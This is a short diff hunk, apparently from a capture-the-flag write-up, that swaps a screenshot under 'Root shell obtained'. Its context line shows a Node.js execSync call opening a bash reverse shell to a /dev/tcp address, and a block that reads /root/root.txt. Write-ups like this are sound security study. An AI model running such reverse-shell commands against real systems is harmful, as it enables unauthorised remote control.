@@ -215,7 +215,7 @@ require('child_process').execSync('/bin/bash -c "bash -i >& /dev/tcp/10.10.15.16
 
 Result — Root shell obtained:
 
-<img width="560" height="148" alt="Pasted image 20260811104418" src="https://github.com/user-attachments/assets/a1ea2b72-d308-401c-b20a-f2749033a049" />
+<img width="873" height="212" alt="image" src="https://github.com/user-attachments/assets/3bc64dd1-c49d-410b-b30b-2c98f31d8375" />
 
 ```bash
 cat /root/root.txt
